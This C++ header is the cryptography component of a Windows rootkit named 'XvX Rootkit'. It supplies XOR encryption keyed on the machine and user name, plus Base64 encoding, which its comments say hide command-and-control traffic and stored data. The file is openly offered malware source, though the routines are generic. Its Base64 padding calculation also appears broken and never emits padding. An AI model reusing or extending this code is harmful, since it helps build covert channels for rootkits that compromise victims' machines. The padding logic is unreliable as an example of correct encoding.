/*
 * XvX Rootkit - Cryptography Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * XOR encryption/decryption and Base64 encoding for C2 communication.
 */

#ifndef CRYPTO_H
#define CRYPTO_H

#include <windows.h>
#include <string>
#include <vector>

using namespace std;

inline wstring generateSystemKey()
{
    // Get the computer name
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computerName, &size);

    // Add the user name
    WCHAR userName[256];
    size = 256;
    GetUserNameW(userName, &size);

    // Combine to create unique key
    wstring key = wstring(computerName) + wstring(userName) + L"SecretKey2025";
    return key;
}

inline wstring xorEncrypt(const wstring &data, const wstring &key)
{
    if (data.empty() || key.empty())
        return data;

    wstring result = data;
    size_t keyLen = key.length();

    for (size_t i = 0; i < result.length(); i++)
    {
        result[i] ^= key[i % keyLen];
    }

    return result;
}

inline wstring xorDecrypt(const wstring &data, const wstring &key)
{
    return xorEncrypt(data, key);
}

inline wstring base64Encode(const wstring &input)
{
    const wchar_t *base64Chars = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    wstring output;

    // Convert wstring to bytes
    vector<BYTE> bytes;
    for (wchar_t c : input)
    {
        bytes.push_back((BYTE)(c & 0xFF));
        bytes.push_back((BYTE)((c >> 8) & 0xFF));
    }

    size_t i = 0;
    while (i < bytes.size())
    {
        BYTE b1 = bytes[i++];
        BYTE b2 = (i < bytes.size()) ? bytes[i++] : 0;
        BYTE b3 = (i < bytes.size()) ? bytes[i++] : 0;

        // Calculate correct padding
        int paddingCount = (i > bytes.size()) ? (i - bytes.size()) : 0;

        output += base64Chars[(b1 >> 2) & 0x3F];
        output += base64Chars[((b1 << 4) | (b2 >> 4)) & 0x3F];
        output += (paddingCount >= 2) ? L'=' : base64Chars[((b2 << 2) | (b3 >> 6)) & 0x3F];
        output += (paddingCount >= 1) ? L'=' : base64Chars[b3 & 0x3F];
    }

    return output;
}

inline wstring base64Decode(const wstring &input)
{
    const wstring base64Chars = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    vector<BYTE> bytes;

    int val = 0, valb = -8;
    for (wchar_t c : input)
    {
        if (c == L'=')
            break;

        size_t pos = base64Chars.find(c);
        if (pos == wstring::npos)
            continue;

        val = (val << 6) + pos;
        valb += 6;

        if (valb >= 0)
        {
            bytes.push_back((BYTE)((val >> valb) & 0xFF));
            valb -= 8;
        }
    }

    // Reconstruct wstring from bytes
    wstring output;
    for (size_t i = 0; i + 1 < bytes.size(); i += 2)
    {
        wchar_t c = (wchar_t)(bytes[i] | (bytes[i + 1] << 8));
        output += c;
    }

    return output;
}

inline wstring encryptForStorage(const wstring &data)
{
    wstring key = generateSystemKey();
    wstring encrypted = xorEncrypt(data, key);
    return base64Encode(encrypted);
}

inline wstring decryptFromStorage(const wstring &data)
{
    wstring key = generateSystemKey();
    wstring decoded = base64Decode(data);
    return xorDecrypt(decoded, key);
}

#endif // CRYPTO_H
